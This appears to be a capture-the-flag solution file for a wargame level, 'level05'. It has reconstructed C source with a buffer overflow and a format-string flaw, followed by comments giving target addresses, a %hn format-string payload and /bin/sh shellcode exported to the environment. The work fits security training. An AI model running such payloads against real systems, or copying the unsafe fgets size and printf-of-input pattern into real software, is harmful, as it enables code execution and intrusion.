#include <stdio.h>
#include <ctype.h>

int	main()
{
	char buffer[40]; // 0x28
	fgets(buffer, 100, stdin);

	int i = 0;
	while (buffer[i] != '\0') {
		if (buffer[i] > '@' && buffer[i] <= 'Z') {
			// tolower()
			buffer[i] ^= 32; // 0x20
		}
		i++;
	}

	print(buffer);
	exit(0);
}

// 0x80497e0
// 0xffffd885
// 10106 55421

// (python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]+ "%55421x%10$hn%10106x%11$hn"'; cat) | ./level05 
// export SHELLCODE=$(python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')